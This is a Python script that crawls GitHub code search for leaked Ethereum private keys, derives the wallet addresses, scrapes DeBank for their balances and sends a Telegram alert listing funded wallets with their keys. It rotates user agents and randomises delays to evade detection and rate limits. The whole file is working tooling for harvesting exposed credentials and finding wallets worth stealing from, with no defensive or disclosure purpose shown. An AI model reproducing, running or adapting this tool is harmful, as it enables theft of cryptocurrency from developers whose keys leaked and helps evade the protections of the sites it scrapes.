#!/usr/bin/env python3
"""
Script to crawl GitHub for private keys and check balances using DeBank API.
Usage: python crawl_github_keys.py <private_key>
"""

import sys
import re
import argparse
import time
import random
import requests
import json
import os
import asyncio
from typing import List, Set, Optional, Dict
from eth_account import Account
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup

# Try to import telegram
try:
    from telegram import Bot
    from telegram.error import TelegramError, RetryAfter
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    Bot = None

# Try to import config
try:
    from src.utils.config import Config
    CONFIG_AVAILABLE = True
except ImportError:
    CONFIG_AVAILABLE = False
    # Fallback to environment variables
    from dotenv import load_dotenv
    load_dotenv()
    class Config:
        TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
        TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Enable unaudited HD wallet features
Account.enable_unaudited_hdwallet_features()

# User agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# Cache file for scanned addresses
CACHE_FILE = "scanned_addresses.json"


def load_scanned_addresses() -> Set[str]:
    """Load scanned addresses from cache file."""
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get("addresses", []))
        except Exception as e:
            print(f"⚠️  Error loading cache: {e}")
    return set()


def save_scanned_address(address: str, scanned_addresses: Set[str]):
    """Save scanned address to cache file."""
    scanned_addresses.add(address)
    try:
        data = {"addresses": list(scanned_addresses)}
        with open(CACHE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"⚠️  Error saving cache: {e}")


async def send_telegram_alert(address: str, private_key: str, balance_info: dict):
    """Send Telegram alert when balance > 0."""
    if not TELEGRAM_AVAILABLE:
        return False
    
    if not Config.TELEGRAM_BOT_TOKEN:
        return False
    
    try:
        bot = Bot(token=Config.TELEGRAM_BOT_TOKEN)
        
        # Format message
        total_value = balance_info.get("total_usd_value", 0)
        tokens = balance_info.get("data", [])
        
        message = f"💰 <b>Wallet với Balance > 0 được tìm thấy!</b>\n\n"
        message += f"📍 <b>Address:</b> <code>{address}</code>\n"
        message += f"🔑 <b>Private Key:</b> <code>0x{private_key[:8]}...{private_key[-8:]}</code>\n"
        message += f"💵 <b>Total Value:</b> ${total_value:,.2f}\n\n"
        
        if tokens and len(tokens) > 0:
            message += f"📦 <b>Tokens ({len(tokens)}):</b>\n"
            # Show top 5 tokens
            sorted_tokens = sorted(
                [t for t in tokens if isinstance(t, dict)],
                key=lambda x: (float(x.get("amount", 0) or 0) * float(x.get("price", 0) or 0)),
                reverse=True
            )[:5]
            
            for token in sorted_tokens:
                symbol = token.get("symbol", token.get("name", "UNKNOWN"))
                amount = float(token.get("amount", 0) or 0)
                price = float(token.get("price", 0) or 0)
                value = amount * price
                if value > 0.01:
                    message += f"  • {symbol}: {amount:.6f} (${value:,.2f})\n"
        
        message += f"\n🔗 <a href='https://debank.com/profile/{address}/'>View on DeBank</a>"
        
        # Send to chat ID(s)
        chat_ids = []
        if Config.TELEGRAM_CHAT_ID:
            # Support multiple chat IDs separated by comma
            chat_ids = [cid.strip() for cid in Config.TELEGRAM_CHAT_ID.split(',')]
        
        if not chat_ids:
            print("    ⚠️  TELEGRAM_CHAT_ID not set, skipping Telegram alert")
            return False
        
        for chat_id in chat_ids:
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    parse_mode='HTML',
                    disable_web_page_preview=False
                )
                print(f"    ✅ Telegram alert sent to chat {chat_id}")
            except RetryAfter as e:
                wait_time = e.retry_after
                print(f"    ⏳ Telegram rate limit, waiting {wait_time}s...")
                await asyncio.sleep(wait_time)
                await bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    parse_mode='HTML',
                    disable_web_page_preview=False
                )
            except TelegramError as e:
                print(f"    ⚠️  Telegram error: {e}")
        
        await bot.close()
        return True
        
    except Exception as e:
        print(f"    ⚠️  Error sending Telegram alert: {e}")
        return False


def create_session_with_retry(max_retries: int = 3, backoff_factor: float = 1.0) -> requests.Session:
    """Create a requests session with retry strategy."""
    session = requests.Session()
    
    retry_strategy = Retry(
        total=max_retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "HEAD"],
        respect_retry_after_header=True
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session


def get_random_delay(base: float, jitter: float = 0.3) -> float:
    """Get random delay with jitter to avoid pattern detection."""
    return base + random.uniform(0, base * jitter)


def get_rate_limit_delay(response: requests.Response) -> int:
    """Extract rate limit delay from response headers."""
    if response.status_code == 429:
        # Check Retry-After header
        retry_after = response.headers.get("Retry-After")
        if retry_after:
            try:
                return int(retry_after) + 5  # Add buffer
            except ValueError:
                pass
        
        # Check X-RateLimit-Reset for GitHub
        reset_time = response.headers.get("X-RateLimit-Reset")
        if reset_time:
            try:
                reset_timestamp = int(reset_time)
                current_time = int(time.time())
                delay = reset_timestamp - current_time
                if delay > 0:
                    return delay + 5  # Add buffer
            except (ValueError, TypeError):
                pass
    
    return None


def normalize_private_key(key: str) -> str:
    """Normalize private key - remove 0x prefix if present."""
    key = key.strip()
    if key.startswith('0x') or key.startswith('0X'):
        return key[2:]
    return key


def is_valid_private_key(key: str) -> bool:
    """Check if a string is a valid Ethereum private key."""
    try:
        normalized = normalize_private_key(key)
        # Private key should be 64 hex characters
        if len(normalized) != 64:
            return False
        # Check if it's valid hex
        int(normalized, 16)
        # Try to create account from it
        Account.from_key('0x' + normalized)
        return True
    except:
        return False


def derive_wallet_address(private_key: str) -> str:
    """Derive wallet address from private key."""
    try:
        normalized = normalize_private_key(private_key)
        account = Account.from_key('0x' + normalized)
        return account.address
    except Exception as e:
        print(f"Error deriving address from key: {e}")
        return None


def get_debank_balance(address: str, session: Optional[requests.Session] = None, retry_count: int = 0) -> dict:
    """Get wallet balance by crawling DeBank profile page with rate limit handling."""
    if session is None:
        session = create_session_with_retry()
    
    max_retries = 3
    base_delay = 2.0
    
    try:
        # DeBank profile page URL
        url = f"https://debank.com/profile/{address}/"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
        }
        
        response = session.get(url, headers=headers, timeout=30)
        
        # Handle rate limiting
        if response.status_code == 429:
            delay = get_rate_limit_delay(response) or (60 * (retry_count + 1))
            if retry_count < max_retries:
                print(f"    ⏳ Rate limited, waiting {delay}s before retry {retry_count + 1}/{max_retries}...")
                time.sleep(delay)
                return get_debank_balance(address, session, retry_count + 1)
            return {"success": False, "error": "Rate limited - max retries exceeded"}
        
        if response.status_code != 200:
            return {"success": False, "error": f"HTTP {response.status_code}"}
        
        # Parse HTML
        soup = BeautifulSoup(response.text, 'lxml')
        
        tokens = []
        total_value = 0.0
        
        # Method 1: Extract from JSON in script tags (DeBank embeds data in window.__INITIAL_STATE__ or similar)
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string:
                text = script.string
                # Look for window.__INITIAL_STATE__ or similar patterns
                if '__INITIAL_STATE__' in text or 'window.__' in text:
                    # Try to extract the JSON object
                    json_patterns = [
                        r'window\.__INITIAL_STATE__\s*=\s*({.+?});',
                        r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                        r'"user":\s*({.+?})',
                        r'"portfolio":\s*({.+?})',
                    ]
                    for pattern in json_patterns:
                        matches = re.findall(pattern, text, re.DOTALL)
                        for match in matches:
                            try:
                                data = json.loads(match)
                                # Navigate through nested structure
                                if isinstance(data, dict):
                                    # Look for balance/token data
                                    if 'portfolio' in data:
                                        portfolio = data['portfolio']
                                        if isinstance(portfolio, dict) and 'total_usd_value' in portfolio:
                                            total_value = float(portfolio.get('total_usd_value', 0))
                                    if 'token_list' in data or 'tokens' in data:
                                        token_list = data.get('token_list') or data.get('tokens', [])
                                        if isinstance(token_list, list):
                                            tokens.extend(token_list)
                            except:
                                pass
        
        # Method 2: Look for total balance in visible HTML elements
        # DeBank often shows total in large text elements
        total_patterns = [
            soup.select_one('h1, h2, h3'),
            soup.select_one('[class*="HeaderValue"]'),
            soup.select_one('[class*="TotalValue"]'),
            soup.select_one('[class*="PortfolioValue"]'),
            soup.find('div', string=re.compile(r'\$[\d,]+')),
        ]
        
        for elem in total_patterns:
            if elem:
                text = elem.get_text(strip=True)
                # Match patterns like $1,234.56 or 1,234.56 USD
                dollar_match = re.search(r'\$?\s*([\d,]+\.?\d*)\s*(?:USD|usd)?', text.replace(',', ''))
                if dollar_match:
                    try:
                        value = float(dollar_match.group(1))
                        if value > total_value:  # Take the largest value found
                            total_value = value
                    except:
                        pass
        
        # Method 3: Look for token cards/rows in the page
        # Common DeBank token display patterns
        token_rows = soup.select('[class*="TokenItem"], [class*="AssetItem"], [class*="BalanceItem"]')
        if not token_rows:
            # Try more generic patterns
            token_rows = soup.select('div[class*="item"], tr[class*="token"], li[class*="asset"]')
        
        for row in token_rows[:30]:  # Limit to first 30
            token_info = {}
            row_text = row.get_text()
            
            # Extract symbol (usually first text or in specific element)
            symbol_patterns = [
                row.select_one('[class*="Symbol"], [class*="Name"], [class*="TokenName"]'),
                row.select_one('strong, b'),
                row.select_one('span:first-child'),
            ]
            for pattern in symbol_patterns:
                if pattern:
                    symbol_text = pattern.get_text(strip=True)
                    # Filter out numbers and common words
                    if symbol_text and len(symbol_text) < 10 and not symbol_text.replace('.', '').isdigit():
                        token_info['symbol'] = symbol_text
                        break
            
            # Extract amounts (numbers with decimals)
            amount_patterns = [
                r'(\d+\.?\d*)\s*(?:ETH|BTC|USDT|USDC|DAI|WBTC)',
                r'(\d+[\d,]*\.?\d*)',
            ]
            for pattern in amount_patterns:
                matches = re.findall(pattern, row_text)
                if matches:
                    try:
                        # Take the first reasonable number
                        for match in matches:
                            num_str = match.replace(',', '')
                            num = float(num_str)
                            if 0.000001 < num < 1e10:  # Reasonable range
                                token_info['amount'] = num
                                break
                    except:
                        pass
            
            # Extract USD value
            usd_patterns = [
                r'\$\s*([\d,]+\.?\d*)',
                r'([\d,]+\.?\d*)\s*USD',
            ]
            for pattern in usd_patterns:
                matches = re.findall(pattern, row_text.replace(',', ''))
                if matches:
                    try:
                        usd_val = float(matches[0])
                        if usd_val > 0.01:  # Only meaningful values
                            if 'amount' in token_info and token_info['amount'] > 0:
                                token_info['price'] = usd_val / token_info['amount']
                            else:
                                # If no amount, this might be the total value
                                if usd_val > total_value:
                                    total_value = usd_val
                    except:
                        pass
            
            # Only add if we have meaningful data
            if token_info and ('symbol' in token_info or 'amount' in token_info):
                if 'amount' in token_info and 'price' in token_info:
                    total_value += token_info['amount'] * token_info['price']
                tokens.append(token_info)
        
        # Method 4: Search entire page text for balance patterns
        if total_value == 0:
            page_text = soup.get_text()
            # Look for patterns like "Total: $1,234.56" or "Portfolio Value: $1,234.56"
            total_matches = re.findall(
                r'(?:total|portfolio|balance|value)[:\s]*\$?\s*([\d,]+\.?\d*)',
                page_text,
                re.IGNORECASE
            )
            if total_matches:
                try:
                    # Take the largest value found
                    values = [float(m.replace(',', '')) for m in total_matches]
                    total_value = max(values) if values else 0
                except:
                    pass
        
        # If we found any data, return it
        if tokens or total_value > 0:
            # Recalculate total if we have token data
            if tokens and total_value == 0:
                for token in tokens:
                    if isinstance(token, dict):
                        amount = float(token.get("amount", 0) or 0)
                        price = float(token.get("price", 0) or 0)
                        total_value += amount * price
            
            return {
                "success": True,
                "data": tokens,
                "total_usd_value": total_value
            }
        else:
            # Fallback: Try API if HTML parsing failed
            # (This might happen if page requires JavaScript rendering)
            try:
                api_url = "https://api.debank.com/user/total_balance"
                api_params = {"id": address.lower()}
                api_headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "application/json",
                }
                api_response = session.get(api_url, headers=api_headers, params=api_params, timeout=10)
                if api_response.status_code == 200:
                    api_data = api_response.json()
                    if isinstance(api_data, dict):
                        total_balance = float(api_data.get("total_usd_value", 0) or 0)
                        return {
                            "success": True,
                            "data": [],
                            "total_usd_value": total_balance,
                            "note": "Data from API fallback"
                        }
            except:
                pass
            
            # If no data found at all
            return {
                "success": True,
                "data": [],
                "total_usd_value": 0.0,
                "note": "Unable to parse balance (page may require JavaScript)"
            }
            
    except requests.exceptions.Timeout:
        if retry_count < max_retries:
            delay = get_random_delay(base_delay * (2 ** retry_count))
            time.sleep(delay)
            return get_debank_balance(address, session, retry_count + 1)
        return {"success": False, "error": "Request timeout - max retries exceeded"}
    except requests.exceptions.RequestException as e:
        if retry_count < max_retries and "429" not in str(e):
            delay = get_random_delay(base_delay * (2 ** retry_count))
            time.sleep(delay)
            return get_debank_balance(address, session, retry_count + 1)
        return {"success": False, "error": f"Request error: {str(e)}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def extract_private_keys_from_text(text: str) -> Set[str]:
    """Extract potential private keys from text."""
    keys = set()
    
    # Pattern 1: PRIVATE_KEY=0x... or PRIVATE_KEY=...
    patterns = [
        (r'PRIVATE_KEY\s*[=:]\s*0x([0-9a-fA-F]{64})', True),  # With 0x prefix
        (r'PRIVATE_KEY\s*[=:]\s*([0-9a-fA-F]{64})', False),  # Without 0x
        (r'private_key\s*[=:]\s*0x([0-9a-fA-F]{64})', True),
        (r'private_key\s*[=:]\s*([0-9a-fA-F]{64})', False),
        (r'PRIVATEKEY\s*[=:]\s*0x([0-9a-fA-F]{64})', True),
        (r'PRIVATEKEY\s*[=:]\s*([0-9a-fA-F]{64})', False),
        (r'["\']([0-9a-fA-F]{64})["\']', False),  # In quotes
        (r'["\']0x([0-9a-fA-F]{64})["\']', True),  # In quotes with 0x
    ]
    
    for pattern, has_0x in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            key = match if isinstance(match, str) else match
            if key:
                # Normalize: remove 0x if pattern already extracted without it
                normalized = normalize_private_key(key)
                if is_valid_private_key(normalized):
                    keys.add(normalized)
    
    # Also look for standalone 64-char hex strings (be more careful here)
    # Only match if they're not part of longer hex strings
    standalone_pattern = r'(?<![0-9a-fA-F])([0-9a-fA-F]{64})(?![0-9a-fA-F])'
    matches = re.findall(standalone_pattern, text, re.IGNORECASE)
    for match in matches:
        normalized = normalize_private_key(match)
        if is_valid_private_key(normalized):
            keys.add(normalized)
    
    return keys


def crawl_github_search(
    query: str, 
    max_pages: int = 5, 
    session: Optional[requests.Session] = None,
    debank_session: Optional[requests.Session] = None,
    on_key_found=None
) -> List[str]:
    """Crawl GitHub search results for private keys with rate limit protection."""
    if session is None:
        session = create_session_with_retry(max_retries=2, backoff_factor=2.0)
    
    private_keys = set()
    base_url = "https://github.com/search"
    base_delay = 5.0  # Increased base delay
    consecutive_errors = 0
    max_consecutive_errors = 3
    
    print(f"🔍 Crawling GitHub search: {query}")
    print(f"📄 Max pages: {max_pages}")
    print("⚠️  Note: GitHub search results are mostly JavaScript-rendered.")
    print("    This script extracts from HTML, results may be limited.")
    print("    Using optimized rate limiting to avoid blocks.\n")
    
    for page in range(1, max_pages + 1):
        try:
            params = {
                "q": query,
                "type": "code",
                "p": str(page)
            }
            
            # Rotate user agent
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            
            print(f"  Fetching page {page}...", end=" ", flush=True)
            
            # Add delay before request (except first page)
            if page > 1:
                delay = get_random_delay(base_delay)
                time.sleep(delay)
            
            response = session.get(base_url, params=params, headers=headers, timeout=20)
            
            # Check rate limit headers
            rate_limit_remaining = response.headers.get("X-RateLimit-Remaining")
            if rate_limit_remaining:
                remaining = int(rate_limit_remaining)
                if remaining < 5:
                    wait_time = 60
                    print(f"⚠️  Rate limit low ({remaining} remaining), waiting {wait_time}s...")
                    time.sleep(wait_time)
            
            if response.status_code == 429:
                delay = get_rate_limit_delay(response) or 120
                print(f"⚠️  Rate limited! Waiting {delay}s...")
                time.sleep(delay)
                consecutive_errors += 1
                if consecutive_errors >= max_consecutive_errors:
                    print("  ❌ Too many rate limit errors, stopping crawl")
                    break
                continue
            elif response.status_code == 403:
                print(f"⚠️  Access forbidden (403)")
                print("     GitHub may be blocking requests. Try again later or use GitHub API token.")
                consecutive_errors += 1
                if consecutive_errors >= max_consecutive_errors:
                    break
                # Wait longer on 403
                time.sleep(get_random_delay(30.0))
                continue
            elif response.status_code != 200:
                print(f"⚠️  Error: HTTP {response.status_code}")
                consecutive_errors += 1
                if consecutive_errors >= max_consecutive_errors:
                    break
                time.sleep(get_random_delay(10.0))
                continue
            
            # Reset error counter on success
            consecutive_errors = 0
            
            # Extract private keys from the HTML response
            found_keys = extract_private_keys_from_text(response.text)
            new_keys = found_keys - private_keys
            private_keys.update(found_keys)
            
            print(f"✅ Found {len(new_keys)} new private key(s)")
            
            # Process each newly found key immediately
            if new_keys and on_key_found:
                for key in new_keys:
                    on_key_found(key, debank_session)
            
            # Check if there are more pages
            if "No code results found" in response.text or "We couldn't find any code" in response.text:
                print("  ℹ️  No more results found")
                break
            
            # Progressive delay - increase delay as we go deeper
            if page < max_pages:
                delay = get_random_delay(base_delay + (page * 0.5))
                time.sleep(delay)
                
        except requests.exceptions.Timeout:
            print(f"⚠️  Timeout on page {page}")
            consecutive_errors += 1
            if consecutive_errors >= max_consecutive_errors:
                break
            time.sleep(get_random_delay(10.0))
        except requests.exceptions.RequestException as e:
            print(f"❌ Request error on page {page}: {e}")
            consecutive_errors += 1
            if consecutive_errors >= max_consecutive_errors:
                break
            time.sleep(get_random_delay(10.0))
        except Exception as e:
            print(f"❌ Error on page {page}: {e}")
            consecutive_errors += 1
            if consecutive_errors >= max_consecutive_errors:
                break
            time.sleep(get_random_delay(5.0))
    
    return list(private_keys)


def main():
    parser = argparse.ArgumentParser(
        description="Crawl GitHub for private keys and check balances using DeBank API"
    )
    parser.add_argument(
        "private_key",
        nargs="?",
        help="Private key to check (optional, will crawl GitHub if not provided)"
    )
    parser.add_argument(
        "--max-pages",
        type=int,
        default=5,
        help="Maximum number of GitHub pages to crawl (default: 5)"
    )
    parser.add_argument(
        "--query",
        type=str,
        default="PRIVATE_KEY=",
        help="GitHub search query (default: PRIVATE_KEY=)"
    )
    
    args = parser.parse_args()
    
    # Create shared session for all requests
    github_session = create_session_with_retry()
    debank_session = create_session_with_retry()
    
    # Load scanned addresses cache
    scanned_addresses = load_scanned_addresses()
    print(f"📋 Loaded {len(scanned_addresses)} previously scanned addresses from cache")
    
    # Cache addresses to avoid duplicate requests during this session
    address_cache = {}
    processed_keys = set()
    base_delay = 3.0  # Increased delay between DeBank requests
    
    def process_found_key(key: str, session: Optional[requests.Session] = None):
        """Process a found private key: derive address and get balance."""
        if key in processed_keys:
            return
        
        processed_keys.add(key)
        
        try:
            print(f"\n  🔑 Found Private Key: 0x{key[:8]}...{key[-8:]}")
            
            # Derive wallet address
            address = derive_wallet_address(key)
            if not address:
                print(f"    ❌ Failed to derive address")
                return
            
            print(f"    📍 Wallet Address: {address}")
            
            # Check if address was already scanned (skip balance check)
            if address.lower() in scanned_addresses:
                print(f"    ⏭️  Address already scanned, skipping balance check")
                return
            
            # Check session cache
            if address in address_cache:
                print(f"    ℹ️  Using cached balance data")
                balance_info = address_cache[address]
            else:
                # Add delay before DeBank request
                delay = get_random_delay(base_delay)
                print(f"    ⏳ Waiting {delay:.1f}s before DeBank request...")
                time.sleep(delay)
                
                print(f"    🔄 Fetching balance from DeBank...")
                balance_info = get_debank_balance(address, session)
                address_cache[address] = balance_info
            
            # Mark address as scanned (regardless of success)
            save_scanned_address(address.lower(), scanned_addresses)
            
            # Display balance information
            if balance_info.get("success"):
                data = balance_info.get("data", [])
                total_value = balance_info.get("total_usd_value", 0)
                
                if isinstance(data, list) and len(data) > 0:
                    print(f"    💵 Total USD Value: ${total_value:,.2f}")
                    print(f"    📦 Tokens: {len(data)}")
                    # Show top tokens
                    sorted_tokens = sorted(
                        [t for t in data if isinstance(t, dict)],
                        key=lambda x: (float(x.get("amount", 0) or 0) * float(x.get("price", 0) or 0)),
                        reverse=True
                    )[:5]  # Show top 5 tokens
                    
                    shown_count = 0
                    for token in sorted_tokens:
                        symbol = token.get("symbol", token.get("name", "UNKNOWN"))
                        amount = float(token.get("amount", 0) or 0)
                        price = float(token.get("price", 0) or 0)
                        value = amount * price
                        if value > 0.01:  # Only show tokens worth more than $0.01
                            print(f"      - {symbol}: {amount:.6f} (${value:,.2f})")
                            shown_count += 1
                    
                    if shown_count == 0 and total_value > 0:
                        print(f"      (Total value: ${total_value:,.2f})")
                elif total_value > 0:
                    print(f"    💵 Total USD Value: ${total_value:,.2f}")
                else:
                    print(f"    💵 Balance: $0.00 (No tokens found)")
                
                # Send Telegram alert if balance > 0
                if total_value > 0:
                    print(f"    📱 Sending Telegram alert...")
                    try:
                        asyncio.run(send_telegram_alert(address, key, balance_info))
                    except Exception as e:
                        print(f"    ⚠️  Error sending Telegram: {e}")
            else:
                error = balance_info.get("error", "Unknown error")
                print(f"    ⚠️  Failed to fetch balance: {error}")
                
        except Exception as e:
            print(f"    ❌ Error processing key: {e}")
    
    # If private key provided, process it first
    if args.private_key:
        normalized = normalize_private_key(args.private_key)
        if is_valid_private_key(normalized):
            print("="*60)
            print("💰 PROCESSING PROVIDED PRIVATE KEY")
            print("="*60)
            process_found_key(normalized, debank_session)
        else:
            print(f"❌ Invalid private key provided")
            sys.exit(1)
    
    # Always crawl GitHub
    print("\n" + "="*60)
    print("🌐 CRAWLING GITHUB")
    print("="*60)
    github_keys = crawl_github_search(
        args.query, 
        args.max_pages, 
        github_session,
        debank_session,
        on_key_found=process_found_key
    )
    
    print(f"\n📊 Total unique private keys processed: {len(processed_keys)}")
    
    if len(processed_keys) == 0:
        print("❌ No private keys found or processed. Exiting.")
        sys.exit(0)
    
    print("\n" + "="*60)
    print("✅ Done!")
    print("="*60)


if __name__ == "__main__":
    main()
